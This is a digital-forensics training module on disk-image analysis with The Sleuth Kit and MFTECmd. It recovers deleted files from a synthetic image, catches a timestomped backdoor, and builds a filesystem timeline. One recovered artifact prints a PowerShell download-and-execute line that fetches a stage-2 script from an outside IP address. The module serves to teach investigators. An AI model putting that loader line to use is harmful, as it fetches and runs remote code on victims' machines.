# Module 15 — Filesystem Forensics & Super-Timelines: The Sleuth Kit + MFTECmd

**Deck mapping:** *Intrusion Hunting Playbook* → "Disk forensics & the super-timeline" (the filesystem spine under every other artifact).
**Goal:** open a raw disk image with **no Windows and no mounting**, read its partition table, list every file *including deleted ones*, **recover** a deleted file, **inspect one file's metadata** down to its two separate timestamp sets, **parse the `$MFT`** with MFTECmd, and **build a filesystem timeline** — then read that timeline to catch an attacker who deleted his tools and **timestomped** his backdoor.

---

## 1. Background — why this matters

Every other module in this lab reads an artifact that Windows *chose* to write down: a Prefetch file, a registry value, an event-log record. This module goes **under** all of that, to the disk itself. When you have a forensic image of a machine, the filesystem is the **ground truth**: it knows about files that were **deleted**, files that were **renamed**, and the **exact timestamps** on everything — including timestamps an attacker tried to fake. Disk forensics answers the questions that anchor an entire investigation: *what was on this machine, when did it get there, what got deleted, and is any of the time evidence a lie?*

### What an investigator gets from the disk that they get nowhere else
- **Deleted files.** When you delete a file, Windows does not scrub the bytes — it just marks the file's record and its clusters "free." Until something reuses them, the file is still there. Disk tools read the record directly and pull the bytes back.
- **Two sets of timestamps.** NTFS stores **two** copies of each file's Modified/Accessed/Created/Changed times (explained below). Comparing them is the single most reliable way to catch **timestomping** (an attacker backdating a file to hide it).
- **A complete, sortable timeline.** Every file carries times; dump them all, sort by time, and you get a minute-by-minute **filesystem timeline** of the machine's history.

### How a disk image is laid out (the three layers you'll walk through)
A raw disk image (a `.dd`/`.raw`/`.E01` made by an imager like FTK Imager or `dd`) is a byte-for-byte copy of a physical disk. Reading it goes top-down through layers, and each Sleuth Kit tool lives at one layer:

1. **The partition table (volume layer).** The very start of the disk holds a small table (MBR or GPT) listing the **partitions** and **where each one starts** (as a sector number). Tool: **`mmls`**.
2. **The filesystem (filesystem layer).** Inside a partition is a filesystem — on Windows, **NTFS**. Tools: **`fsstat`** (its parameters), **`fls`** (its file list).
3. **The file's record + content (metadata & data layers).** NTFS describes every file with one record in a master table called the **`$MFT`**. Tools: **`istat`** (read one record), **`icat`** (read the file's bytes).

### NTFS, the `$MFT`, and the two timestamp sets (the crux of this module)
NTFS keeps its own bookkeeping in hidden files whose names start with `$`. The most important is the **`$MFT` (Master File Table)** — an array of ~1 KB **records**, one per file or directory. The record number *is* the file's id (TSK calls it the "inode" or "MFT entry"; entry 0 is the `$MFT` itself). Each record is built from **attributes**, and two of them carry timestamps:

- **`$STANDARD_INFORMATION` (`$SI`, attribute type `0x10`)** — the times Explorer shows. Crucially, a normal user-mode program **can change these** via the Windows `SetFileTime` API. This is what timestomping tools rewrite.
- **`$FILE_NAME` (`$FN`, attribute type `0x30`)** — a *second* set of times, stored alongside the file's name. These are updated by the **kernel** on create/rename/move and are **much harder for an attacker to forge** with ordinary tools.

> **The timestomp tell:** at real file creation, NTFS writes `$SI` and `$FN` together, so they match. A timestomping tool rewrites only `$SI` (backdating it to look old) and **cannot easily touch `$FN`** — so afterwards **`$SI` Created is *earlier* than `$FN` Created**. A second tell: many stomping tools only set **whole seconds**, leaving `$SI` times ending in `.0000000` while `$FN` keeps its 100-nanosecond precision. You will see both tells, in real tool output, below.

### What the two tools in this module do
- **The Sleuth Kit (TSK)** — Brian Carrier's open-source disk-forensics toolkit (the engine under Autopsy). A family of small command-line tools (`mmls`, `fls`, `istat`, `icat`, `mactime`, …), each working at one layer above. Reads images **read-only and offline** — it never mounts anything, so the evidence can't change. Version in `dfir-aio:v2`: **4.11.1**.
- **MFTECmd** — Eric Zimmerman's dedicated `$MFT`/`$J`/`$LogFile` parser (.NET). It flattens the `$MFT` into a rich CSV with **both** timestamp sets in separate columns *and* pre-computed timestomp flags (`SI<FN`, `uSecZeros`). Version in `dfir-aio:v2`: **2026.5.0**.

> **Plain-language summary:** TSK lets you read a disk image like a forensic surgeon — partitions, every file (even deleted), exact metadata, raw bytes. MFTECmd turns the NTFS master table into a spreadsheet that flags faked timestamps for you. Together they give you the **filesystem timeline** that the rest of the investigation hangs on.

---

## 2. The scenario in this module's data

You are handed a disk image, **`disk-DESKTOP-SDN1RPT.raw`**, pulled from the desktop of user **`mortysmith`** — the patient-zero host from the lab's running "Stolen Szechuan Sauce" narrative (Modules 1-4). It is a small, **synthetic** NTFS image built specifically for this lesson (no real malware; see [`data/README.md`](data/README.md) for full provenance, licence, and the generator script — *knowing what your evidence is, is itself a DFIR skill*). It was constructed so the filesystem-level facts are exact and checkable:

| What's on disk | Where | The point |
|---|---|---|
| `coreupdater.exe` — a C2 backdoor | `Windows/Temp/` | **Timestomped** to look like a 2019 OS file. You'll prove it. |
| `win32k.sys` — a real old OS driver | `Windows/System32/` | Genuinely old (2019) and *consistent*. The **control** — old is not the same as faked. |
| `update.ps1` — a stage-2 downloader | `…/AppData/Local/Temp/` | **Deleted** by the attacker. You'll recover it. |
| `loot.zip` — a ~13 KB exfil archive | `…/Downloads/` | **Deleted** by the attacker. You'll recover it from its clusters. |
| benign user/OS files | various | Baseline for comparison. |

The real intrusion happened on **2026-06-15, ~09:10–09:20 UTC**. Hold that window in mind — half the lesson is that the *disk* tells you this even though the attacker tried to hide it.

---

## 3. Setup

```bash
cd module-15-filesystem-timeline
docker run -it --rm --network none -v "$PWD/data":/data dfir-aio:v2
```
- **`docker run`** — start a container from an image.
- **`-it`** — interactive terminal (you get a shell inside).
- **`--rm`** — delete the container on exit (keeps your host clean).
- **`--network none`** — **no network at all**. Evidence can never "phone home"; the analysis is provably offline.
- **`-v "$PWD/data":/data`** — **mount** this module's `data/` folder into the container at `/data` so the tools can read the image and write results back to your real folder.
- **`dfir-aio:v2`** — the all-in-one image; it already contains the full Sleuth Kit and MFTECmd.

Everything below is run **inside that container**, from `/data`.

> **Windows-native alternative:** on the lab VM you can run the EZ Tools directly (`C:\DFIR\tools\MFTECmd\MFTECmd.exe`); TSK is most easily used through **Autopsy** (its GUI) or a WSL/`dfir-aio` shell. Flags are identical — only paths differ.

---

## 4. Step-by-step walkthrough

### Step 1 — Read the partition table (`mmls`): where does the filesystem start?
You cannot point a filesystem tool at the *disk* — you must point it at the *partition* inside the disk. `mmls` reads the MBR/GPT table and tells you where each partition begins.

```bash
mmls disk-DESKTOP-SDN1RPT.raw
```
- The only argument is the image. (Add **`-t dos`**/**`-t gpt`** to force the table type, or **`-B`** to also print sizes in bytes; not needed here — `mmls` auto-detects.)

**Real output:**
```
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000020479   0000018432   NTFS / exFAT (0x07)
```
**Read it:** there is one real partition — **NTFS, starting at sector 2048** (the standard 1 MiB alignment gap is the "Unallocated" row before it). **`2048` is the magic number for the rest of this module:** every filesystem tool needs it as **`-o 2048`** ("offset 2048 sectors"). Forget it and the tools read the wrong bytes and fail. (Units are 512-byte sectors, shown in the header.)

> *(Optional)* `fsstat -o 2048 disk-DESKTOP-SDN1RPT.raw` confirms the filesystem and prints NTFS details — volume name `OSDISK`, **1024-byte MFT entries**, MFT starting cluster, cluster size. Handy for sanity-checking, not required to proceed.

### Step 2 — List every file, including deleted ones (`fls`)
`fls` walks the directory tree and prints each name with its MFT entry number.

```bash
fls -o 2048 -r -p disk-DESKTOP-SDN1RPT.raw
```
- **`-o 2048`** — the **partition offset in sectors** from Step 1. (Almost every TSK filesystem command needs this.)
- **`-r`** — **recurse** into subdirectories (otherwise you only see the root).
- **`-p`** — print **full paths** (cleaner than the indented tree when recursing).

**Real output (trimmed to the interesting rows):**
```
d/d 68-144-2:	Users/mortysmith
-/r * 80-128-2:	Users/mortysmith/AppData/Local/Temp/update.ps1
r/r 78-128-2:	Users/mortysmith/Desktop/notes.txt
r/r 77-128-2:	Users/mortysmith/Documents/Q3_recipes.xlsx
-/r * 81-128-2:	Users/mortysmith/Downloads/loot.zip
r/r 76-128-2:	Windows/System32/cmd.exe
r/r 75-128-2:	Windows/System32/win32k.sys
r/r 79-128-2:	Windows/Temp/coreupdater.exe
```
**How to read a line** — take `-/r * 81-128-2:	…/loot.zip`:
- **`-/r`** — two file types: *name-type* / *metadata-type*. `r` = regular file, `d` = directory. A leading **`-`** means the name slot no longer points to live metadata — i.e. it's **deleted**.
- **`*`** — TSK's flag for a **deleted** entry. (There it is on `update.ps1` and `loot.zip`.)
- **`81`** — the **MFT entry number** (the file's id). You'll feed this to `istat`/`icat`.
- **`-128-2`** — the attribute id (`128` = `$DATA`); ignore for now.

So in one command you can see the benign baseline *and* the two files the attacker deleted (`update.ps1`, `loot.zip`) — still listed, because their MFT records haven't been reused.

### Step 3 — Show *only* the deleted entries (`fls -d`)
To make the deletions jump out, ask for only them:
```bash
fls -o 2048 -r -d -p disk-DESKTOP-SDN1RPT.raw
```
- **`-d`** — show **only deleted** entries (`-u` would show only undeleted).

**Real output:**
```
-/r * 80-128-2:	Users/mortysmith/AppData/Local/Temp/update.ps1
-/r * 81-128-2:	Users/mortysmith/Downloads/loot.zip
-/r * 16:	$OrphanFiles/OrphanFile-16
... (OrphanFile-17 … 23)
```
**Read it:** the two attacker artifacts are confirmed deleted. The `$OrphanFiles/OrphanFile-16…23` rows are **normal NTFS noise** — they are reserved `$MFT` metadata slots NTFS pre-creates, not real user files; ignore them. **Leads: entries `80` and `81`.**

### Step 4 — Recover the deleted files (`icat`)
`icat` streams a file's raw bytes by MFT entry — and it works on **deleted** files whose clusters are still intact.

```bash
icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 80
icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 > recovered_loot.zip
```
- **`-o 2048`** — partition offset (as always).
- **`-r`** — attempt **recovery** of a deleted file (follow the record's cluster list even though it's marked free).
- **`80` / `81`** — the MFT entry numbers from Step 3.
- Redirect (`>`) the bytes to a file to save them; without redirection they print to the terminal.

**Real output — entry 80 (`update.ps1`) printed straight to screen:**
```
IEX (New-Object Net.WebClient).DownloadString('http://45.77.13.37/c2.ps1')  # stage-2 loader
```
There's the smoking gun: a deleted **PowerShell downloader** that pulls stage-2 from `45.77.13.37`. **Recovered from a file the attacker thought he'd erased.**

**Real output — entry 81 (`loot.zip`) recovered to a file:**
```
$ icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 | head -3
PKSTOLEN: szechuan sauce formula row 001 ,sweet,umami,secret
STOLEN: szechuan sauce formula row 002 ,sweet,umami,secret
STOLEN: szechuan sauce formula row 003 ,sweet,umami,secret
$ icat -o 2048 -r disk-DESKTOP-SDN1RPT.raw 81 | wc -c
12984
```
The `PK` magic bytes confirm it's a ZIP, and the recovered **12,984 bytes** are the staged stolen data. Because this file was **non-resident** (bigger than one cluster), `icat` carved it back from its data clusters — exactly what you'd do to a deleted malware binary before hashing it or running it through `capa`/`FLOSS`/YARA (the earlier malware-triage modules).

### Step 5 — Inspect one file's metadata and catch the timestomp (`istat`)
`istat` dumps everything in a single MFT record — allocation status, size, the cluster list, and **both** timestamp sets. This is where timestomping is exposed.

```bash
istat -o 2048 disk-DESKTOP-SDN1RPT.raw 79
```
- **`79`** — the MFT entry for `Windows/Temp/coreupdater.exe` (from Step 2).

**Real output:**
```
$STANDARD_INFORMATION Attribute Values:
Created:	2019-03-15 12:00:00.000000000 (UTC)
File Modified:	2019-03-15 12:00:00.000000000 (UTC)
MFT Modified:	2026-06-29 19:08:09.267375500 (UTC)
Accessed:	2019-03-15 12:00:00.000000000 (UTC)

$FILE_NAME Attribute Values:
Name: coreupdater.exe
Created:	2026-06-15 09:12:33.456789000 (UTC)
File Modified:	2026-06-15 09:12:33.456789000 (UTC)
MFT Modified:	2026-06-15 09:12:33.512004400 (UTC)
Accessed:	2026-06-15 09:12:34.001022200 (UTC)
```
**Read it — three independent tells, all in one record:**
1. **`$SI` Created (2019-03-15) is *earlier* than `$FN` Created (2026-06-15).** A real file has these set *together*. The only way they diverge like this is that something **rewrote `$SI`** after creation — **timestomping**. The attacker backdated the file ~7 years to bury it among genuine OS files.
2. **Sub-second precision is zeroed in `$SI`** (`12:00:00.000000000`) but **intact in `$FN`** (`09:12:33.456789000`). The stomping tool only set whole seconds; the kernel-written `$FN` kept its 100-ns precision.
3. **`$SI` MFT-Modified is 2026-06-29** — recent — while the other `$SI` times claim 2019. The "C-time" updates whenever the record changes and is awkward to backdate; here it betrays *when the stomp happened* (the day the image was built/collected).

Now compare against a file that is **legitimately** old — the real OS driver `win32k.sys` (entry 75):
```bash
istat -o 2048 disk-DESKTOP-SDN1RPT.raw 75
```
```
$STANDARD_INFORMATION Attribute Values:
Created:	2019-03-15 08:34:21.765432100 (UTC)
...
$FILE_NAME Attribute Values:
Created:	2019-03-15 08:34:21.765432100 (UTC)
```
**Read it:** here `$SI` Created **equals** `$FN` Created, **to the 100-nanosecond**, and both carry sub-second precision. This file is old *and consistent* — **not** stomped. That contrast is the whole skill: *"old" is not suspicious; "`$SI` older than `$FN`" is.*

### Step 6 — Parse the `$MFT` with MFTECmd (the timestomp flags, for free)
Doing the `$SI`-vs-`$FN` comparison by eye works for one file; across a whole `$MFT` you want it computed for you. MFTECmd does exactly that. First carve the `$MFT` out of the image (it's always MFT entry **0**):
```bash
icat -o 2048 disk-DESKTOP-SDN1RPT.raw 0 > /data/MFT
```
*(The carved `MFT` is already shipped in `data/` so you can skip straight to parsing.)* Now parse it:
```bash
MFTECmd -f /data/MFT --csv /data --csvf mft.csv
```
- **`-f /data/MFT`** — the metadata **f**ile to parse. MFTECmd **auto-detects** that it's a `$MFT` (it also accepts `$J`, `$LogFile`, `$Boot`, `$SDS`).
- **`--csv /data`** — write CSV output into `/data`.
- **`--csvf mft.csv`** — name the output file (otherwise it's auto-timestamped).

**Real output:**
```
/data/MFT: FILE records found: 35 (Free records: 47) File size: 82KB
	CSV output will be saved to /data/mft.csv
```
Open `mft.csv` (Excel / LibreOffice / Timeline Explorer). The columns that matter here:
- **`Created0x10` / `Created0x30`** — `$SI` Created (`0x10`) vs `$FN` Created (`0x30`). (MFTECmd only fills `0x30` when it *differs* from `0x10`, so a populated `Created0x30` is itself a flag.)
- **`SI<FN`** — a pre-computed boolean: **True** when `$SI` Created is earlier than `$FN` Created (the timestomp condition).
- **`uSecZeros`** — **True** when `$SI` sub-seconds are all zero (the whole-second tell).
- **`InUse`** — False = the record is for a **deleted** file.

Filtering this module's `mft.csv` to the interesting files gives:
```
FileName          InUse   SI<FN   uSecZeros   Created0x10                   Created0x30
coreupdater.exe   True    True    True        2019-03-15 12:00:00.0000000   2026-06-15 09:12:33.4567890
win32k.sys        True    False   False       2019-03-15 08:34:21.7654321   (blank)
cmd.exe           True    False   False       2019-03-15 08:34:19.1234567   (blank)
Q3_recipes.xlsx   True    False   False       2026-05-20 14:02:11.7731002   (blank)
update.ps1        False   False   False       2026-06-15 09:10:05.3312044   (blank)
loot.zip          False   False   False       2026-06-15 09:20:15.8890231   (blank)
```
**Read it:** **`coreupdater.exe` is the only row with `SI<FN=True` and `uSecZeros=True`** — and the only one with a populated `Created0x30`. In Timeline Explorer you'd just sort/colour on those two columns and the stomped file rises to the top instantly. Note `update.ps1` and `loot.zip` show **`InUse=False`** — MFTECmd sees the deletions too, and their **real** `$SI` creation times (`09:10` and `09:20`) pin the intrusion window.

### Step 7 — Build the filesystem timeline (`fls -m` → `mactime`)
A timeline turns "a pile of files with times" into "a story in time order." The classic TSK pipeline is two steps: dump a **bodyfile** (every file's times in a pipe-delimited format), then sort it with **`mactime`**.

```bash
fls -o 2048 -r -m C: disk-DESKTOP-SDN1RPT.raw > fls.body
mactime -b fls.body -d -z UTC > timeline.csv
```
- **`fls … -m C:`** — emit **bodyfile** output, prefixing every path with the drive letter `C:`. (`-m` is what switches `fls` from a listing to a bodyfile.)
- **`-r`/`-o 2048`** — recurse / partition offset, as before.
- **`mactime -b fls.body`** — read that **b**odyfile.
- **`-d`** — output as **CSV** (comma-delimited).
- **`-z UTC`** — interpret/label times in **UTC** (keep every timeline source in the same zone so they line up when you merge them).

**Real output (the rows that matter, from `timeline.csv`):**
```
Fri Mar 15 2019 12:00:00 , 77 , ma.b , r/r... , 79-128-2 , "C:/Windows/Temp/coreupdater.exe"
Mon Jun 15 2026 09:10:05 , 93 , ma.b , -/r... , 80-128-2 , "C:/Users/mortysmith/AppData/Local/Temp/update.ps1 (deleted)"
Mon Jun 15 2026 09:12:33 , 96 , m.cb , r/r... , 79-48-3  , "C:/Windows/Temp/coreupdater.exe ($FILE_NAME)"
Mon Jun 15 2026 09:20:15 , 12984 , .a.b , -/r... , 81-128-2 , "C:/Users/mortysmith/Downloads/loot.zip (deleted)"
```
**How to read a `mactime` line:** time, size, then the **`macb`** flag field — **m**odified / **a**ccessed / **c**hanged(MFT) / **b**orn(created) — a letter present means *that* timestamp falls on this line's time; a dot means it doesn't. So `ma.b` = this is the file's Modified+Accessed+Born moment.

**Read the story — and the trap:**
- The **`$SI`-based** line for `coreupdater.exe` (`79-128-2`) lands way back in **March 2019** with `ma.b`. **If you trusted the standard timeline, you'd never connect the backdoor to the intrusion.**
- But the **`$FILE_NAME`** line for the same file (`79-48-3`) sits right in the intrusion window, **Jun 15 2026 09:12:33** — *that's* when the backdoor was really created.
- The deleted `update.ps1` (09:10) and `loot.zip` (09:20) bracket it. A clean kill-chain: **drop downloader → drop & timestomp backdoor → stage `loot.zip` → delete the evidence**, all inside ten minutes.

> **Why `$FN` saves you:** `mactime` on a plain `fls` bodyfile keys off `$SI` — exactly the times the attacker faked. Because the bodyfile also includes the `$FILE_NAME` rows (the `(... $FILE_NAME)` lines), the **true** creation time is right there next to the fake one. This is the timeline equivalent of the `istat` comparison in Step 5.

#### Same timeline, from MFTECmd (the `$MFT` route)
MFTECmd can emit a bodyfile too, so you can build the same timeline from the parsed `$MFT` (useful when all you were handed is the `$MFT`, not a full image):
```bash
MFTECmd -f /data/MFT --body /data --bodyf mft.body --bdl C
mactime -b /data/mft.body -d -z UTC > timeline_mft.csv
```
- **`--body /data`** — write a TSK **bodyfile** into `/data`.
- **`--bodyf mft.body`** — its filename.
- **`--bdl C`** — the **b**ody **d**rive **l**etter to prefix (`C`).

Either route gives you the **filesystem half of a super-timeline**.

### Step 8 — Where the heavier tooling fits (Plaso)
A full **super-timeline** merges the filesystem (this module) with registry, EVTX (Module 5), Prefetch (Module 1), Amcache (Module 3), browser history, and more, into one sorted file. The standard one-shot merger is **Plaso** (`log2timeline.py` to ingest everything, `psort.py` to sort/filter).

> **Tool gap (verified on `dfir-aio:v2`, 2026-06-29):** **Plaso is *not* installed** in the container — `which log2timeline.py psort.py` returns nothing. That's deliberate (Plaso is heavy). Until it's added, build the timeline **per layer** as you did here — TSK `fls`+`mactime` and MFTECmd for the filesystem, `EvtxECmd` for logs (Module 5), RegRipper for the registry — and **merge them in Timeline Explorer** (all EZ output and `mactime -d` CSV are easy to load and sort together). Adding Plaso is a recommended future enhancement to the image, not a requirement for this lesson.

---

## 5. Reading the output — suspicious vs. benign

| Signal | Where you see it | Benign looks like… | Suspicious looks like… |
|---|---|---|---|
| `$SI` vs `$FN` Created | `istat`; MFTECmd `SI<FN` / `Created0x30` | equal (set together) | **`$SI` earlier than `$FN`** → timestomp |
| Sub-second precision | `istat`; MFTECmd `uSecZeros` | both sets keep nanoseconds | `$SI` ends in `.0000000` while `$FN` doesn't |
| Deleted (`*` / `InUse=False`) | `fls -d`; MFTECmd `InUse` | temp/installer churn | tools/scripts/archives deleted right after use |
| File location | `fls -r -p` | apps under `Program Files` | executables in `\Temp`, `\Users\…\Downloads`, `\AppData` |
| `mactime` `$SI` vs `$FN` rows | `timeline.csv` | the two agree | a file's `$SI` row is far from its `$FN` row |

**Triage discipline:** an old creation date is **not** by itself suspicious — real OS files are old (that's why `win32k.sys` is in the data). What's suspicious is an **inconsistency**: `$SI` older than `$FN`, whole-second `$SI`, an executable in a Temp folder, a tool deleted minutes after it ran. Judge the **combination**, and let MFTECmd's `SI<FN`/`uSecZeros` columns and your deleted-file list point you at the few records worth a hard look.

---

## 6. Investigative narrative — the story the disk tells

Reconstructing `DESKTOP-SDN1RPT` from the filesystem alone:

1. **09:10:05** — a PowerShell downloader, `update.ps1`, is written to the user's `AppData\Local\Temp`. Its recovered contents (`icat`) show it pulling stage-2 from `http://45.77.13.37/c2.ps1`.
2. **09:12:33** — the backdoor **`coreupdater.exe`** is created in `C:\Windows\Temp` (its **`$FN`** time — the truth). The attacker immediately **timestomps** it, backdating `$SI` to *2019-03-15* with whole-second precision to make it blend in with genuine OS files like `win32k.sys`.
3. **09:20:15** — stolen data is staged as `loot.zip` (~13 KB) in `Downloads`.
4. **Cleanup** — `update.ps1` and `loot.zip` are **deleted** to cover tracks.

Every one of those steps survived in the filesystem: the deletions were recoverable (clusters intact), and the timestomp was self-defeating because the attacker could only forge **one** of NTFS's two timestamp sets. The `$SI` timeline said "2019, nothing to see here"; the `$FN` timeline, `istat`, and MFTECmd's `SI<FN` flag said "**09:12:33 on the morning of the intrusion.**" That is the power of disk forensics: it remembers what the operating system — and the attacker — tried to forget.

---

## 7. Try-it-yourself exercises

1. **Find the offset yourself.** Run `mmls` and read the NTFS partition's Start sector. Then run `fls -r -p` with the wrong offset (e.g. `-o 0`) and with the right one (`-o 2048`). Explain what you get each time and *why* the offset matters.
2. **Recover and verify.** `icat` entry **81** to `recovered_loot.zip`, confirm `wc -c` reports **12984** bytes and the file starts with `PK`. Why can a deleted file still be recovered in full?
3. **Prove the stomp two ways.** For `coreupdater.exe` (entry **79**): (a) from `istat`, write the one sentence that proves timestomping; (b) find the same file in `mft.csv` and confirm `SI<FN` and `uSecZeros` are both **True**. Which method scales to a 500,000-record `$MFT`, and why?
4. **Spot the control.** Compare `istat` for `win32k.sys` (75) and `coreupdater.exe` (79). Both have a 2019 `$SI` creation date — what *single* difference tells you one is genuinely old and the other is faked?
5. **Build and read the timeline.** Run the `fls -m` → `mactime` pipeline. In `timeline.csv`, find the **two** lines for `coreupdater.exe` (`79-128-2` and `79-48-3`). What is each one's date, which attribute does each come from, and which one would you put in your report?
6. **(Stretch)** Run `get-data.sh`, download the **real** DFIR Madness Case 001 desktop image, and repeat Steps 1-7 against it — including carving the real `$MFT` with `icat … 0` and running MFTECmd. Did the real attacker timestomp anything?

---

## 8. Key takeaways

- A disk image is read in **layers**: `mmls` (partitions) → `fsstat`/`fls` (filesystem & files) → `istat`/`icat` (one file's metadata & bytes). TSK does all of it **offline and read-only** — it never mounts the evidence.
- The partition **offset from `mmls`** (`-o 2048` here) is required by nearly every other TSK command. Always run `mmls` first.
- **Deleted ≠ gone.** `fls -d` lists deleted files and `icat -r` recovers their bytes until the clusters are reused — that's how you pull back a wiped dropper or staged archive.
- NTFS keeps **two** timestamp sets. `$SI` is forgeable; `$FN` is kernel-written. **`$SI` Created earlier than `$FN` Created = timestomping**, and **whole-second `$SI`** is a second tell. `istat` shows both; MFTECmd flags them automatically as **`SI<FN`** and **`uSecZeros`**.
- `fls -m` + `mactime` (or `MFTECmd --body`) builds the **filesystem timeline** — the spine of a super-timeline. Because it carries the `$FN` rows, it survives an attacker who only stomped `$SI`.
- A full super-timeline normally uses **Plaso** to merge every artifact; Plaso is **not** in `dfir-aio:v2`, so here you timeline per-layer and merge in Timeline Explorer.

---

## 9. Sources & further reading

- The Sleuth Kit — official site & wiki (per-tool man pages: `mmls`, `fls`, `icat`, `istat`, `mactime`): <https://www.sleuthkit.org/> · <https://github.com/sleuthkit/sleuthkit/wiki>
- Brian Carrier, *File System Forensic Analysis* (Addison-Wesley) — the definitive reference for NTFS internals and the TSK layers.
- MFTECmd & Timeline Explorer — Eric Zimmerman: <https://github.com/EricZimmerman/MFTECmd> · <https://ericzimmerman.github.io/>
- Microsoft Learn — NTFS Master File Table and the `$STANDARD_INFORMATION` / `$FILE_NAME` attributes (the two timestamp sets).
- 13Cubed — "NTFS Timestamps / Timestomping" and "MFTECmd" episodes (the `$SI` vs `$FN` and sub-second-precision detection).
- SANS FOR500 / FOR508 — bodyfile→`mactime` timelining and `$MFT`/`$UsnJrnl` super-timeline methodology.
- Plaso / log2timeline — the super-timeline merger (heavier alternative, not installed in `dfir-aio:v2`): <https://plaso.readthedocs.io/>
- DFIR Madness — "The Stolen Szechuan Sauce" (Case 001), the intrusion the lab's narrative is built on: <https://dfirmadness.com/the-stolen-szechuan-sauce/>

---
*This is an advanced add-on module. Prerequisites: the artifact modules it ties together — [Module 1 (Prefetch)](../module-01-prefetch-pecmd), [Module 3 (Amcache)](../module-03-amcache-amcacheparser), [Module 5 (EvtxECmd)](../module-05-evtx-evtxecmd) — and it feeds straight into the [Capstone](../module-11-capstone) super-timeline.*
